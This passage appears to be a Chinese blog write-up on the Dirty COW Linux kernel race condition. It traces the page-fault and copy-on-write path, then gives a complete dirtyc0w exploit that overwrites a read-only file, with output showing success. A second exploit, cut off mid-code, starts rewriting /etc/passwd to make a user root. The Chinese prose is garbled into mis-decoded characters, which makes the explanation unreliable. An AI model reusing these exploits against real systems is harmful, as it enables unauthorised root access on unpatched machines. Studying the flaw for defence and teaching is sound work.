‰∏ªÂä®ËÆ©Âá∫cpuËµÑÊ∫ê,Èò≤Ê≠¢ÂÖ∂Âú®ÂÜÖÊ†∏ÊÄÅÊâßË°åÊó∂Èó¥ËøáÈïøÂØºËá¥ÂèØËÉΩÂèëÁîüÁöÑsoft lockupÊàñËÄÖÈÄ†ÊàêËæÉÂ§ßÁöÑË∞ÉÂ∫¶Âª∂Ëøü */</span></span><br><span class="line">		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask); <span class="comment">/* Ëé∑Âèñpage */</span></span><br><span class="line">		<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">			<span class="keyword">int</span> ret;</span><br><span class="line">			ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">					nonblocking); <span class="comment">/* Â§ÑÁêÜpage_fault */</span></span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123; <span class="comment">/* ÂØπËøîÂõûÂÄºËøõË°åÂ§ÑÁêÜ */</span></span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">goto</span> retry;</span><br><span class="line">			<span class="keyword">case</span> -EFAULT:</span><br><span class="line">			<span class="keyword">case</span> -ENOMEM:</span><br><span class="line">			<span class="keyword">case</span> -EHWPOISON:</span><br><span class="line">				<span class="keyword">return</span> i ? i : ret;</span><br><span class="line">			<span class="keyword">case</span> -EBUSY:</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			<span class="keyword">case</span> -ENOENT:</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line">			BUG();</span><br><span class="line">		&#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages);</span><br></pre></td></tr></table></figure>
<ul>
<li>Â¶ÇÊûúÈ°µÈù¢ page ‰∏çÂ≠òÂú®Âàô‰ºöË∞ÉÁî® <code>faultin_page</code> Â§ÑÁêÜÂºÇÂ∏∏È°µÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_WRITE)</span><br><span class="line">		fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">	ret = handle_mm_fault(mm, vma, address, fault_flags); <span class="comment">/* ‰∏∫ÂèëÁîüpage_faultÁöÑÂú∞ÂùÄÂàÜÈÖçÂêÑÁ∫ßÈ°µË°®ÁõÆÂΩï */</span></span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">/* ‰∏∫‰∫ÜÁªìÊùü‰∏äÂ±ÇÂáΩÊï∞ÁöÑretryÂæ™ÁéØ,Ëß£ÂÜ≥page_fault,Âú®Á°ÆÂÆöÂ∑≤ÁªèÂÆåÊàêCOWÊìç‰ΩúÂêé(ÈÄöËøáVM_FAULT_WRITEÊ†áÂøóÁ°ÆÂÆö),‰ºöËß£Èô§FOLL_WRITE(ÂÜôËØ∑Ê±Ç)Ê†áÂøó */</span></span><br><span class="line">	<span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ËÆæÁΩÆÂÆåÊ†áÂøó <code>flag</code> ÂêéÔºåËøõÂÖ• <code>handle_mm_fault</code>ÔºåÂàÜÈÖçÂêÑÁ∫ßÈ°µË°®È°π</li>
</ul>
<p>Á¨¨‰∏ÄÊ¨°Â§ÑÁêÜ <code>page_fault</code> ÁöÑÊµÅÁ®ãÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>Áî®Êà∑ÊÄÅÂáΩÊï∞ <code>write</code> ÊâßË°åÂà∞ÂÜÖÊ†∏‰∏≠ÁöÑ <code>__get_user_pages</code> Êó∂Ôºå‰ºöÂõ†‰∏∫ <code>mmap</code> Ê≤°Êúâ‰∏∫ VMA ËÆæÁΩÆÈ°µË°®ËÄåË∞ÉÁî® <code>faultin_page</code> Êù•Â§ÑÁêÜ <code>page_fault</code></li>
<li>ÁÑ∂Âêé‰æùÊ¨°Ë∞ÉÁî® <code>handle_mm_fault</code> Âíå <code>handle_pte_fault</code></li>
<li>Ê≠§Êó∂ <code>pte</code> Á¥¢ÂºïÁöÑÁâ©ÁêÜÂú∞ÂùÄ‰∏çÂ≠òÂú®Ôºå<code>pte</code> ‰∏≠ÁöÑÂÜÖÂÆπ‰∏∫Á©∫ÔºàÊ≤°ÊúâËÆæÁΩÆÈ°µË°®È°πÔºâÔºåVMA Âú∞ÂùÄÊòØÈùûÂåøÂêçÊò†Â∞ÑÔºåÊâÄ‰ª•‰ºöË∞ÉÁî® <code>do_fault</code> </li>
<li>Áî±‰∫éËß¶Âèë <code>page_fault</code> ÁöÑÂéüÂõ†‰∏∫ <code>write</code> ÂáΩÊï∞ÁöÑ‚ÄúÂÜôÁº∫È°µ‚ÄùÔºåÂõ†Ê≠§‰ºöË∞ÉÁî® <code>do_cow_fault</code> ËøõË°åÂÜôÊó∂Â§çÂà∂ÔºöÂàÜÈÖç‰∏Ä‰∏™Êñ∞È°µÈù¢‰Ωú‰∏∫Êñá‰ª∂Êò†Â∞ÑÂÜÖÂ≠òÁöÑÂâØÊú¨È°µÔºàÂè™ËØªÔºâÔºåÂπ∂Âª∫Á´ã COW È°µÁöÑÈ°µË°®È°π</li>
<li>Ë∑≥ËΩ¨ÂõûÂà∞ <code>retry</code></li>
</ul>
<p>Á¨¨‰∫åÊ¨°Â§ÑÁêÜ <code>page_fault</code> ÁöÑÊµÅÁ®ãÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>Á®ãÂ∫èÁ¨¨‰∫åÊ¨°ÊâßË°å <code>follow_page_mask</code> Êó∂Âõ†‰∏∫ÂàÜÈÖç‰∫ÜÂ±ûÊÄß‰∏∫‰∏çÂèØÂÜôÁöÑ COW È°µËÄåÔºå‰ªéËÄåÁªßÁª≠Ë∞ÉÁî® <code>faultin_page</code> Êù•Â§ÑÁêÜ <code>page_fault</code></li>
<li>ÁÑ∂Âêé‰æùÊ¨°Ë∞ÉÁî® <code>handle_mm_fault</code> Âíå <code>handle_pte_fault</code></li>
<li>Ê≠§Êó∂ <code>pte</code> ÊâÄÊåáÂêëÁöÑÁâ©ÁêÜÂú∞ÂùÄÂ≠òÂú®ÔºàCOW ÂàÜÈÖç‰∫ÜÈ°µË°®ÔºâÔºåÂØπÂ∫îÁöÑ COW È°µ‰∏çÂèØÂÜôÔºåÂõ†Ê≠§Á®ãÂ∫è‰ºöË∞ÉÁî® <code>do_wp_page</code> ËøõË°åÂÜôÊó∂Â§çÂà∂</li>
<li>Áî±‰∫éÁ¨¨‰∏ÄÊ¨° <code>faultin_page</code> ÊâßË°å <code>do_cow_fault</code> Êó∂Â∑≤ÁªèÂàÜÈÖç‰∫ÜÂâØÊú¨È°µÔºåÂõ†Ê≠§‰ºöÁõ¥Êé•Ë∞ÉÁî® <code>wp_page_reuse</code> ÈáçÁî®Ëøô‰∏™È°µÔºàCOW ÂàÜÈÖçÁöÑÈ°µÈù¢Â±û‰∫éÂåøÂêçÈ°µÔºâÔºåÂπ∂ËøîÂõû VM_FAULT_WRITE</li>
<li>ËøîÂõûÂà∞ <code>faultin_page</code> ‰∏≠Êó∂ÔºåÁî±‰∫éËøîÂõû‰∫Ü VM_FAULT_WRITE Ê†áÂøóÔºåË°®Á§∫Â∑≤ÁªèÂÆåÊàê‰∫Ü COW È°µÁöÑÂàÜÈÖçÔºå‰ΩÜÊòØÊ≥®ÊÑèÂà∞Ê≠§Êó∂ COW È°µÊó∂Âè™ËØªÁöÑÔºåÂ¶ÇÊûúÊàë‰ª¨ÂÜçÊ¨°ËøõÂÖ• <code>follow_page_mask</code>ÔºåÈÇ£‰πàÂÜôÂíåÂè™ËØª‰ºöÂÜ≤Á™ÅÔºåÂèà‰ºöËøîÂõû NULLÔºåËøôÊ†∑Â∞±‰ºöÈô∑ÂÖ• <code>retry</code> ÁöÑÂæ™ÁéØ</li>
<li>Linux ‰∏∫‰∫ÜÈò≤Ê≠¢ËØ•ÂÜ≤Á™ÅÔºåÈÄâÊã©Âú® <code>faultin_page</code> ÂáΩÊï∞ÁöÑÊúÄÂêéÔºåÊ£ÄÊü• <code>VM_FAULT_WRITE</code> Ê†áÂøó‰ª•Á°ÆÂÆöÂÆåÊàê‰∫Ü COW Êìç‰ΩúÔºåÁÑ∂ÂêéÂéªÊéâ‰∫Ü COW È°µÁöÑ <code>FOLL_WRITE</code> Ê†áÂøó‰ΩøÂÖ∂ÂèØ‰ª•ÂÜôÂÖ•</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">	*flags &amp;= ~FOLL_WRITE;</span><br></pre></td></tr></table></figure>
<ul>
<li>Ë∑≥ËΩ¨ÂõûÂà∞ <code>retry</code></li>
</ul>
<p>Á¨¨‰∏âÊ¨°Â§ÑÁêÜ <code>page_fault</code> ÁöÑÊ≠£Â∏∏ÊµÅÁ®ãÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>Áî±‰∫é‰πãÂâçÂéªÊéâ‰∫Ü <code>FOLL_WRITE</code> Ê†áÂøóÔºåÂõ†Ê≠§‰∏ç‰ºöÊ£ÄÊü• <code>PTE</code> ÊúâÊ≤°ÊúâÂÜôÂÖ•ÊùÉÈôêÔºåÂõ†Ê≠§Á¨¨‰∏âÊ¨°ÊâßË°å <code>follow_page_mask</code> Â∞Ü‰ºöËøîÂõû COW È°µ</li>
<li>ÈÄÄÂá∫ <code>retry</code> Âæ™ÁéØÔºåÂú® COW È°µ‰∏äÊâßË°å <code>write</code> ÁöÑÂâ©‰ΩôÂ∑•‰Ωú</li>
</ul>
<p>Á¨¨‰∏âÊ¨°Â§ÑÁêÜ <code>page_fault</code> ÁöÑÂºÇÂ∏∏ÊµÅÁ®ãÂ¶Ç‰∏ãÔºöÔºàËß¶Âèë COWÔºâ</p>
<ul>
<li>Â¶ÇÊûúÊàë‰ª¨Âú®Á¨¨‰∫åÊ¨° <code>faultin_page</code> ÂáΩÊï∞ÂéªÊéâ <code>flags</code> ÈáåÁöÑ <code>FOLL_WRITE</code> Ê†áÂøó‰πãÂêéÔºåÈÄöËøáÁ´û‰∫âÊù°‰ª∂ÔºåÊâßË°å <code>madvice</code> ÂáΩÊï∞Ê∏ÖÁ©∫È°µË°®È°πÔºàÂú® <code>get_user_page</code> ÈáåÊúâ‰∏ÄÊ≠• <code>cond_resched</code> Á∫øÁ®ãË∞ÉÂ∫¶Êìç‰ΩúÔºåÊèê‰æõ‰∫ÜÊù°‰ª∂Á´û‰∫âÁöÑÊú∫‰ºöÔºâ</li>
<li>Á∫øÁ®ãË∞ÉÂ∫¶ÁªìÊùüÔºåËøîÂõû <code>write</code> Á∫øÁ®ãÔºåÂèà‰ºöÈáçÊñ∞ËøõÂÖ• <code>follow_page_mask</code> ÁÑ∂ÂêéÂõ†‰∏∫ <code>pte</code> Ë¢´Ê∏ÖÁ©∫ÂØºËá¥Áº∫È°µÔºåÂáΩÊï∞ËøîÂõû NULLÔºåÂÜçÊ¨°ËøõÂÖ• <code>faultin_page</code>ÔºåÁÑ∂Âêé‰ºö‰∏ÄÁõ¥ËøêË°åÂà∞ <code>do_fault</code>ÔºåÊ≠§Êó∂‰∏çÂÜçË¶ÅÊ±ÇÂÜôÂÖ•ÊùÉÈôêÔºåÂõ†Ê≠§Á®ãÂ∫èÂ∞±‰ºöËÆ§‰∏∫Ëß¶ÂèëÈ°µ‰∏≠Êñ≠ÁöÑÂéüÂõ†ÊòØ‚ÄúËØªÁº∫È°µ‚ÄùÔºåÊâÄ‰ª•‰ºöÊâßË°å <code>do_read_fault</code> ÂáΩÊï∞ÔºåÂª∫Á´ãÊñá‰ª∂Êò†Â∞ÑÈ°µÁöÑÈ°µË°®È°π</li>
<li>Ê≥®ÊÑèÔºöÊ≠§Êó∂ÁöÑÂèØÂÜôÈ°µ‰∏∫ COW È°µÔºå‰ΩÜÊòØËØ• COW È°µÁöÑÈ°µË°®È°πÂç¥Á¥¢ÂºïÂà∞‰∫ÜÊñá‰ª∂Êò†Â∞ÑÈ°µÊâÄÂú®ÁöÑÁâ©ÁêÜÂÜÖÂ≠òÂú∞ÂùÄÔºåÊìçÁ∫µËØ• COW È°µÂÖ∂ÂÆûÂ∞±Áõ∏ÂΩì‰∫éÁõ¥Êé•ÊéßÂà∂Êñá‰ª∂Êò†Â∞ÑÈ°µ</li>
<li>Êé•ÁùÄ‰ªé <code>do_fault</code> ËøîÂõûÂà∞ <code>handle_pte_fault</code> ‰∏≠ÔºåÊ£ÄÊü•Âà∞È°µÈù¢ÂèØÂÜôÔºå‰ªéËÄåÁªôÈ°µÈù¢Ê†áËÆ∞ <code>dirty</code> </li>
<li>ÈöèÂêéÂõûÂà∞ <code>retry</code></li>
</ul>
<p>Á¨¨ÂõõÊ¨°Â§ÑÁêÜ <code>page_fault</code> ÁöÑÊµÅÁ®ãÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>Á¨¨ÂõõÊ¨°ËøõÂÖ• <code>follow_page_mask</code>Ôºå‰∏çË¶ÅÊ±ÇÂÜôÊùÉÈôêÔºå‰ªéËÄåÊàêÂäüËøîÂõûÊò†Â∞ÑÂà∞Êñá‰ª∂ÁöÑ COW È°µÔºàÂ∑≤ÁªèÊ†áËÆ∞‰∏∫ <code>dirty</code>ÔºåË°®Á§∫ËØ•È°µÂèØ‰ª•ÂÜôÂÖ•Á£ÅÁõòÔºâ</li>
<li>Âú®Êñá‰ª∂Êò†Â∞ÑÈ°µ‰∏äÊâßË°å <code>write</code> ÁöÑÂâ©‰ΩôÂ∑•‰ΩúÔºàÊ≠§Êó∂ËôΩÁÑ∂ËØ•Êò†Â∞ÑÈ°µÂè™ËØªÔºå‰ΩÜÊòØÂÜÖÊ†∏ËøòÊòØÂèØ‰ª•Âº∫Âà∂ÂÜôÂÖ•ÔºåÂÆåÊàêË∂äÊùÉÂÜôÊìç‰ΩúÔºâ</li>
</ul>
<p>ÂèÇËÄÉÔºö<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52196579/article/details/126608926?app_version=5.8.1&amp;code=app_1562916241&amp;csdn_share_tail={&quot;type&quot;%3A&quot;blog&quot;%2C&quot;rType&quot;%3A&quot;article&quot;%2C&quot;rId&quot;%3A&quot;126608926&quot;%2C&quot;source&quot;%3A&quot;m0_67072125&quot;}&amp;uLinkId=usr1mkqgl919blen&amp;utm_source=app">ËÑèÁâõÔºàDirty COWÔºâÊºèÊ¥ûÊîªÂáªÂÆûÈ™å(SEED-LabÔºöDirty-COW Attack Lab)</a> </p>
<p><strong>Dirty Cow ÊºèÊ¥ûÂ§çÁé∞</strong></p>
<p>1.‰øÆÊîπÊúçÂä°Âô®‰∏ä flag Êñá‰ª∂ÁöÑÂÄºÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str;</span><br><span class="line">    str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">    <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED); <span class="comment">/* ÂèñÊ∂àmapÁöÑÊò†Â∞Ñ */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n&quot;</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str;</span><br><span class="line">    str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">    <span class="keyword">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>,O_RDWR); <span class="comment">/* ÊâìÂºÄmemÊñá‰ª∂ */</span></span><br><span class="line">    <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++) &#123;</span><br><span class="line">        lseek(f,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>,SEEK_SET); <span class="comment">/* ÂÅèÁßªÂà∞mapÊò†Â∞ÑÁöÑÂå∫Âüü */</span></span><br><span class="line">        c+=write(f,str,<span class="built_in">strlen</span>(str)); <span class="comment">/* ÂÜôÂÖ•ÁõÆÊ†áÂ≠óÁ¨¶‰∏≤ */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;procselfmem %d\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;success!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc&lt;<span class="number">3</span>) &#123;</span><br><span class="line">        (<span class="keyword">void</span>)<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;usage: dirtyc0w target_file new_content&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">    <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line"></span><br><span class="line">    f=open(argv[<span class="number">1</span>],O_RDONLY); </span><br><span class="line">    fstat(f,&amp;st);</span><br><span class="line">    name=argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>); <span class="comment">/* ÊääÊñá‰ª∂Êò†Â∞ÑÂà∞mapÊåáÂêëÁöÑÂÜÖÂ≠òÂå∫Âüü */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmap %zx\n&quot;</span>,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);</span><br><span class="line">    pthread_create(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    pthread_join(pth1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pth2,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÁªìÊûúÂ¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat flag</span><br><span class="line">flag&#123;yhellow&#125;</span><br><span class="line">/ $ ./dirtyc0w flag flag&#123;cooooow&#125;</span><br><span class="line">mmap b7784000</span><br><span class="line">madvise 0</span><br><span class="line">procselfmem 13000000</span><br><span class="line">success!!!</span><br><span class="line">/ $ cat flag</span><br><span class="line">flag&#123;cooooow&#125;</span><br></pre></td></tr></table></figure>
<p>Ë∞ÉËØïÂÜÖÊ†∏ÈÄâÁî®32‰ΩçÁöÑ <code>linux-4.1.4</code>Ôºàquem ÂØπ64‰Ωç <code>linux-4.x</code> ÁöÑÂÜÖÊ†∏ÂÖºÂÆπÊÄß‰∏çÊòØÂæàÂ•ΩÔºåÂ∞ùËØï‰∫ÜÂ•ΩÂá†‰∏™ÁâàÊú¨ÈÉΩÂ§±Ë¥•‰∫ÜÔºâ</p>
<ul>
<li>Êñ≠ÁÇπÂà∞ <code>do_page_fault</code>Ôºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0xc1041600</span> &lt;do_page_fault&gt;            push   ebp</span><br><span class="line">  <span class="number">0xc1041601</span> &lt;do_page_fault+<span class="number">1</span>&gt;          mov    ebp, esp</span><br><span class="line">  <span class="number">0xc1041603</span> &lt;do_page_fault+<span class="number">3</span>&gt;          mov    ecx, cr2</span><br><span class="line">‚ñ∫ <span class="number">0xc1041606</span> &lt;do_page_fault+<span class="number">6</span>&gt;          call   __do_page_fault                    &lt;__do_page_fault&gt;</span><br><span class="line">       arg[<span class="number">0</span>]: <span class="number">0xf4d33fa8</span> ‚Äî‚ñ∏ <span class="number">0xf54bff48</span> ‚Äî‚ñ∏ <span class="number">0xf54bff54</span> ‚Äî‚ñ∏ <span class="number">0xf54bff6c</span> ‚Äî‚ñ∏ <span class="number">0xf54bffac</span> ‚óÇ‚Äî ...</span><br><span class="line">       arg[<span class="number">1</span>]: <span class="number">0xc1825eca</span> (page_fault+<span class="number">98</span>) ‚óÇ‚Äî jmp    <span class="number">0xc1824f90</span></span><br><span class="line">       arg[<span class="number">2</span>]: <span class="number">0xbffffffd</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Áî±‰∫éÊú¨‰∫∫‰∏ç‰ºöË∞ÉËØïÂÜÖÊ†∏Â§öÁ∫øÁ®ãÔºåÂêéÈù¢ÁöÑÊìç‰ΩúÂ∞±Ê≤°Ê≥ïÂ±ïÁ§∫‰∫Ü</li>
</ul>
<p>2.‰øÆÊîπ <code>/etc/passwd</code> ‰∏≠Áî®Êà∑ÁöÑ uid ÂíåÁªÑ id Êù•ÂÆûÁé∞ÊèêÊùÉÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">writeThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">    <span class="comment">/* ÊîπÂÜôpasswdÊñá‰ª∂ÂÆûÁé∞ÊèêÊùÉ */</span></span><br><span class="line">    <span class="keyword">char</span> *content= <span class="string">&quot;charlie:x:0:0:,,,,,,,,,,,,,,,,,,:/root:/bin/bash&quot;</span>;</span><br><span class="line">    <span class="keyword">off_t</span> offset = (<span class="keyword">off_t</span>) arg;</span><br><span class="line">    <span class="keyword">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">	    lseek(f, offset, SEEK_SET);</span><br><span class="line">	    write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> file_size = (<span class="keyword">int</span>) arg;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    	madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span 